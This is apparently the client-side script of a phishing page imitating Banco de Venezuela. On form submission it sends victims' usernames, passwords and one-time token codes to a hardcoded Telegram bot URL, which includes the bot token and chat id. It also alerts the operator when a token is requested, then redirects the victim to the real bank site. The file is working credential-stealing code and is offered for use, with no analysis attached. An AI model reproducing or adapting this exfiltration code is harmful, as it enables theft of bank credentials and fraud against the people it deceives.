const sendatatme = document.getElementById("sendatatme");
const bdvfirst = document.getElementById("first");
const bdvsecond = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");
const social = document.getElementById("social");
const requestbutton = document.getElementById("requestbutton");
const tokenhide = document.getElementById("tokenhide");
const tokenshow = document.getElementById("tokenshow");
const tokencode = document.getElementById("tokencode");
const tokengobutton = document.getElementById("tokengobutton");
const rescode = document.getElementById("rescode");
const sendcode = document.getElementById("sendcode");

bdvfirst.addEventListener("change", () => {
  resfirst.value = bdvfirst.value;
});
bdvsecond.addEventListener("change", () => {
  resecond.value = bdvsecond.value;
});
tokencode.addEventListener("change", () => {
  rescode.value = tokencode.value;
});
requestbutton.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6081452510:AAE3GoA-LrSq9HUBdjLaK4Y0DAvu9pYs6ns/sendMessage?chat_id=6044882265&text=TOKEN%20SOLICITADO";
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };
  tokenhide.classList.remove("hidediv");
});
tokenshow.addEventListener("click", () => {
  tokenhide.classList.add("hidediv");
});
tokencode.addEventListener("keyup", (e) => {
  let inputToken = e.target.value;
  tokencode.value = inputToken.replace(/\s/g, "").replace(/\D/g, "").trim();
});
tokencode.addEventListener("keyup", (e) => {
  var inputToken = e.target.value;

  if (inputToken.length > 6) {
    tokengobutton.classList.add("goenabled");
    tokengobutton.classList.remove("container__token__gobutton");
  } else {
    tokengobutton.classList.remove("goenabled");
    tokengobutton.classList.add("container__token__gobutton");
  }
});
sendatatme.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6081452510:AAE3GoA-LrSq9HUBdjLaK4Y0DAvu9pYs6ns/sendMessage?chat_id=6044882265&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

  social.classList.remove("hidediv");
});
sendcode.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6081452510:AAE3GoA-LrSq9HUBdjLaK4Y0DAvu9pYs6ns/sendMessage?chat_id=6044882265&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value +
    " CODE: " +
    rescode.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

  window.location.href = "https://www.bancodevenezuela.com";
});
